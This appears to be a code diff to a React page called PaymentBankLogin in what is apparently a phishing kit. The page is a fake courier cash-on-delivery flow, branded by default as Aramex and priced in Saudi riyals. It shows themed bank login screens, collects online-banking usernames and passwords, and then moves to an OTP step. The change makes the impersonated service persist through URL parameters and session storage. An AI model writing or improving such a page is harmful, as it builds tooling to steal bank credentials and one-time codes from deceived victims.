@@ -1,4 +1,4 @@
-import { useEffect, useState, type CSSProperties } from "react";
+import { useEffect, useMemo, useState, type CSSProperties } from "react";
 import { useParams, useNavigate } from "react-router-dom";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
@@ -15,10 +15,16 @@ import { getBankLoginTheme } from "@/lib/bankThemes";
 import FullScreenLoader from "@/components/FullScreenLoader";
 
 const PaymentBankLogin = () => {
-  const { id } = useParams();
+  const { id: rawIdParam } = useParams();
   const navigate = useNavigate();
   const { toast } = useToast();
-  const { data: linkData, isLoading } = useLink(id);
+  const shareId = rawIdParam || "";
+  const { data: linkData, isLoading } = useLink(shareId);
+  const currentSearch = typeof window !== "undefined" ? window.location.search : "";
+  const urlServiceKey = useMemo(
+    () => (typeof window !== "undefined" ? new URLSearchParams(window.location.search).get('service') : null),
+    []
+  );
   
   // Bank login credentials state
   const [username, setUsername] = useState("");
@@ -58,30 +64,37 @@ const PaymentBankLogin = () => {
   }
 
   const payload = (linkData.payload ?? {}) as Record<string, any>;
-  const serviceKey = payload.service_key || customerInfo.service || 'aramex';
+  const storedServiceKey = typeof window !== "undefined" ? sessionStorage.getItem('serviceKey') : null;
+  const serviceKey = payload.service_key || payload.service || urlServiceKey || customerInfo.serviceKey || customerInfo.service || storedServiceKey || 'aramex';
   const serviceName = payload.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
   const amount = payload?.cod_amount || 500;
   const formattedAmount = `${amount} ر.س`;
+
+  useEffect(() => {
+    if (serviceKey) {
+      sessionStorage.setItem('serviceKey', serviceKey);
+    }
+  }, [serviceKey]);
   
   useEffect(() => {
     const method = sessionStorage.getItem('paymentMethod');
     const bank = sessionStorage.getItem('selectedBank');
 
     if (!method) {
-      navigate(`/pay/${id}/track`);
+      navigate(`/pay/${shareId}/track${currentSearch}`);
       return;
     }
 
     if (method !== 'login') {
-      navigate(`/pay/${id}/details`);
+      navigate(`/pay/${shareId}/details${currentSearch}`);
       return;
     }
 
     if (!bank || bank === 'skipped') {
-      navigate(`/pay/${id}/track`);
+      navigate(`/pay/${shareId}/track${currentSearch}`);
     }
-  }, [id, navigate]);
+  }, [shareId, navigate, currentSearch]);
 
   const selectedBank = selectedBankId && selectedBankId !== 'skipped' ? getBankById(selectedBankId) : null;
   const selectedCountryData = selectedCountry ? getCountryByCode(selectedCountry) : null;
@@ -262,7 +275,7 @@ const PaymentBankLogin = () => {
     });
     
     // Navigate to OTP verification
-    navigate(`/pay/${id}/otp`);
+    navigate(`/pay/${shareId}/otp${currentSearch}`);
   };
   
   return (
